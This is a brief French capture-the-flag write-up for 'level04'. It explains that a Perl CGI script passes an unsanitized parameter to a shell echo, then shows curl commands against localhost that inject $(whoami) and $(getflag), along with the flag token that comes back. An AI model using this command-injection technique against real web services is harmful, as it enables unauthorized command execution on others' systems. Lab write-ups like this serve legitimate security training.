le code de level04.pl ne semble pas sanitize le parametre qui peut etre passé au serveur http de ce fait en passant x=$(commande) la commande est executée dans le print du echo.

curl "http://localhost:4747/level04.pl?x=\$(whoami)"
flag04

curl "http://localhost:4747/?x=\$(getflag)"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap